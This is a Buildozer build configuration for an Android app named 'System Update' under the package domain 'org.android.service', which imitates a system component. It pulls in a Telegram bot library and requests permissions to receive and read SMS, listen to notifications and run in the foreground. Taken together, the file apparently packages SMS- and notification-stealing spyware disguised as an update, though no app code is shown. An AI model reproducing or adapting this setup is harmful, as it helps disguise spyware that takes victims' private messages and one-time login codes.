[app]
title = System Update
package.name = sysupdate
package.domain = org.android.service
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 1.0
requirements = python3, pyTelegramBotAPI, jnius

android.permissions = INTERNET, RECEIVE_SMS, READ_SMS, BIND_NOTIFICATION_LISTENER_SERVICE, POST_NOTIFICATIONS, FOREGROUND_SERVICE
android.api = 31
android.minapi = 21
android.sdk = 31
android.ndk = 25b
android.archs = arm64-v8a, armeabi-v7a
android.accept_sdk_license = True

[buildozer]
log_level = 2
warn_on_root = 1
